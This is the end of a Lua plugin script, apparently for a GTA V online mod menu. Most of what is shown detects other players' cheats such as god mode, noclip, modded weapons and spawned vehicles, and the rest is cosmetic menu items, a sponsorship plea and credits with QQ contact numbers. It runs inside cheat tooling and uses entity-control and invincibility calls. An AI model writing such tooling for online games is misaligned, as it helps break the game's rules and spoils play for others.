        custom_pet = entities.create_ped(28, pet, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(custom_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(custom_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(custom_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(custom_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(custom_pet)
    custom_pet = nil
end)

menu.toggle_loop(modder_detections, "无敌模式", {}, "检测战局玩家是否在使用无敌.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for _, id in interior_stuff do
            if players.is_godmode(pid) and not players.is_in_interior(pid) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and GetSpawnState(pid) == 99 and GetInteriorPlayerIsIn(pid) == id then
                util.draw_debug_text(players.get_name(pid) .. " 是无敌模式")
                break
            end
        end
    end 
end)

menu.toggle_loop(modder_detections, "载具无敌模式", {}, "检测玩家载具是否在使用无敌.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for _, id in interior_stuff do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(vehicle) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) 
                and GetSpawnState(pid) == 99 and GetInteriorPlayerIsIn(pid) == id and pid == driver then
                    util.draw_debug_text(players.get_name(driver) ..  " 是无敌模式的载具")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(modder_detections, "作弊武器", {}, "检测是否有玩家使用无法获得的武器.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in modded_weapons do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.draw_debug_text(players.get_name(pid) .. " 正在使用作弊武器 " .. "(" .. hash .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modder_detections, "自由镜头检测", {}, "检测是否有玩家使用自由镜头(又称无碰撞)", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(pid)
        util.yield()
        local currentpos = players.get_position(pid)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(pid)
        and GetInteriorPlayerIsIn(pid) == 0 and GetSpawnState(pid) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(players.get_position(players.user()), players.get_position(pid)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(pid) .. " 是无碰撞")
            break
        end
    end
end)

menu.toggle_loop(modder_detections, "超级驾驶检测", {}, "检测是否有玩家在修改载具速度", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        if class ~= 15 and class ~= 16 and veh_speed >= 200 and (players.get_vehicle_model(pid) ~= util.joaat("oppressor") and players.get_vehicle_model(pid) ~= util.joaat("oppressor2")) and pid == driver then
            util.toast(players.get_name(driver) .. " 正在使用超级驾驶")
            break
        end
    end
end)

menu.toggle_loop(modder_detections, "观看检测", {}, "检测是否有玩家在观看你.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local cam_dist = v3.distance(players.get_position(players.user()), players.get_cam_pos(pid))
        local ped_dist = v3.distance(players.get_position(players.user()), players.get_position(pid))
        if cam_dist < 20.0 and ped_dist > 75.0 and not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) then
            util.toast(players.get_name(pid) .. " Is Watching You")
            break
        end
    end
end)

menu.toggle_loop(modder_detections, "雷霆加入检测", {}, "检测是否有玩家使用了雷霆加入.", function()
    for _, pid in players.list(false, true, true) do
        if GetSpawnState(players.user()) == 0 then return end
        local old_sh = players.get_script_host()
        util.yield(100)
        local new_sh = players.get_script_host()
        if old_sh ~= new_sh then
            if GetSpawnState(pid) == 0 and players.get_script_host() == pid then
                util.toast(players.get_name(pid) .. " 触发了雷霆加入检测,现在被归类为作弊者")
                break
            end
        end
    end
end)

menu.toggle_loop(modder_detections, "修改后的天基炮", {}, "检测是否有人在使用修改过的天基炮.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if IsPlayerUsingOrbitalCannon(pid) and not TASK.GET_IS_TASK_ACTIVE(ped, 135) and GetSpawnState(pid) ~= 0 then
            util.toast(players.get_name(pid) .. " 正在使用修改过的天基炮")
            break
        end
    end
end)

menu.toggle_loop(modder_detections, "生成载具", {}, "检测是否有人在驾驶生成的车辆.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local hash = players.get_vehicle_model(pid)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        for i, veh in things do -- because getting the decor int for them didnt want to work
            if hash == util.joaat(veh) and DECORATOR.DECOR_GET_INT(vehicle, "MPBitset") == 8 then
            return end
        end
        local spawned_vals = {8, 1024}
        if table.contains(spawned_vals, DECORATOR.DECOR_GET_INT(vehicle, "MPBitset")) and PED.IS_PED_A_PLAYER(driver) and players.get_vehicle_model(pid) ~= 0 and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and GetSpawnState(players.user()) ~= 0 then
            for _, name in unreleased_vehicles do
                if hash == util.joaat(name) and pid == driver then
                    util.draw_debug_text(players.get_name(driver) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
                    return
                end
            end
                util.draw_debug_text(players.get_name(driver) .. " 正在驾驶生成载具 " .. "(模型: " .. util.reverse_joaat(players.get_vehicle_model(pid)) .. ")")
                break
        end
    end
end)

menu.toggle_loop(normal_detections, "传送检测", {}, "检测一个玩家传送了多远.(注意:他们传送并不意味着他们是用作弊软件,也可能是任务导致)", function()
    for _, pid in players.list(false, true, true) do
        local old_pos = players.get_position(pid)
        util.yield(50)
        local cur_pos = players.get_position(pid)
        local distance_between_tp = v3.distance(old_pos, cur_pos)
        for _, id in interior_stuff do
            if GetInteriorPlayerIsIn(pid) == id and GetSpawnState(pid) ~= 0  and players.exists(pid) then
                util.yield(100)
                if distance_between_tp > 300.0 then
                    util.toast(players.get_name(pid) .. " 传送到 " .. SYSTEM.ROUND(distance_between_tp) .. " 米")
                    break
                end
            end
        end
    end
end)

menu.toggle_loop(normal_detections, "天基炮", {}, "检测是否有人在使用天基炮.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if IsPlayerUsingOrbitalCannon(pid) and TASK.GET_IS_TASK_ACTIVE(ped, 135) then
            util.draw_debug_text(players.get_name(pid) .. " 是在轨道炮处")
        end
    end
end)

menu.toggle_loop(normal_detections, "狗屎无敌模式检测", {}, "检测是否有人通过触发某种突发事件来获得无敌模式.\n这是一个哪怕绿玩也可以卡出来的垃圾无敌", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped)
        for _, id in interior_stuff do
            if players.is_in_interior(pid) and players.is_godmode(pid) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and GetSpawnState(pid) == 99 and GetInteriorPlayerIsIn(pid) == id and height >= 0.0 then
                util.draw_debug_text(players.get_name(pid) .. " 是狗屎无敌模式")
                break
            end
        end
    end 
end)

--其他

menu.toggle_loop(misc, "战局信息显示", {"hostqu"}, "", function()
    zhujixvlie()
    end)

mcxh=1
mcr=255
mcg=0
mcb=0
menu.toggle(misc, "脚本名称显示", {"scriptname"}, "", function(state)

sname = state
   while sname do
       if mcxh==1 and mcg<256 then
           HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)	
           if mcg == 255 then
               mcxh=2
           else
               mcg=mcg+1
           end
       elseif mcxh==2 and mcr>-1 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcr == 0 then
               mcxh=3
           else
               mcr=mcr-1
           end
       elseif mcxh==3 and mcb<256 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcb == 255 then
               mcxh=4
           else
               mcb=mcb+1
           end
       elseif mcxh==4 and mcg>-1 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcg == 0 then
               mcxh=5
           else
               mcg=mcg-1
           end
       elseif mcxh==5 and mcr<256 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcr == 255 then
               mcxh=6
           else
               mcr=mcr+1
           end
       elseif mcxh==6 and mcb>-1 then
           HUD.SET_TEXT_COLOUR(mcr,mcg,mcb,255)
           if mcb == 0 then
               mcxh=1
           else
               mcb=mcb-1
           end
       end
   draw_string(string.format("      ¦-&#8721;\n~bold~~italic~PIE Lua Script"), 0.43,0.04, 0.55,6)
       util.yield()
   end
end)

menu.toggle_loop(misc, "按我", {""}, "", function()
      GRAPHICS.DRAW_RECT(0.5, 0.5, 1, 1, 0, 0, 0, 255)
      HUD.SET_TEXT_SCALE(2.0,5)
      HUD.SET_TEXT_FONT(5)
      HUD.SET_TEXT_CENTRE(0)
      HUD.SET_TEXT_COLOUR(255, 255, 255, 255)
      HUD.SET_TEXT_OUTLINE(true)
      util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~y~大帅b，求赞助")
      HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.5,0.3,0)
end)


local mingxie=menu.list(misc, "鸣谢", {}, "")
menu.divider(mingxie, "==感谢技术支持与赞助们==")
menu.action(mingxie, "易宇", {}, "YIYU作者", function()
    util.show_corner_help(" ‹  ‹    \nQQ:3548999193\n  ‹  ‹ ")
end)
menu.action(mingxie, "赞助联系我", {}, "PIE", function()
    util.show_corner_help(" ‹  ‹    \nQQ:3311906673\n  ‹  ‹ ")
end)
menu.action(mingxie, "GT", {}, "GTLua作者", function()
    util.show_corner_help(" ‹  ‹    \nQQ:1114983012\n  ‹  ‹ ")
end)
menu.action(mingxie, "Homer", {}, "heezy作者", function()
    util.show_corner_help(" ‹  ‹    \nQQ:1733635528\n  ‹  ‹ ")
end)
menu.action(mingxie, "呆呆", {}, "daidailua作者", function()
    util.show_corner_help(" ‹  ‹    \nQQ:2816390189\n  ‹  ‹ ")
end)
menu.action(mingxie, "...", {}, "联系3311906673", function()
    util.show_corner_help(" ‹  ‹    \nQQ:期待您的加入\n  ‹  ‹ ")
end)


menu.hyperlink(misc, "加入群聊", "https://jq.qq.com/?_wv=1027&k=81lDqf3B", "加入QQ群聊")



while true do
    Black_list()
    Black_self()
    util.yield()
end

util.on_stop(function ()
    util.show_corner_help("~b~~bold~感谢使用PIE Lua")
end)
end